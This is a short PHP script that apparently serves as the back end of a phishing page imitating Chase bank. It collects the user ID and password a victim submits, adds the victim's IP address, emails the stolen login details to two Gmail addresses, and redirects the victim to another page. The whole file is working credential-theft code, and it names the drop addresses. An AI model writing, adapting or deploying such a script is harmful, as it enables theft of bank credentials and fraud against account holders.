<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || GhostMode || :------\n";
$message .= "User ID             : ".$_POST['userId']."\n";
$message .= "Password              : ".$_POST['password']."\n";
$message .= "----: || GhostMode || :------\n";
$message .= "IP: ".$ip."\n";


$recipient = "stevbodaesq@gmail.com, ktwllms840@gmail.com";
$subject = " Chase ACCESS | ".$ip."\n";

mail($recipient,$subject,$message);
header("Location:  access.html");
?>


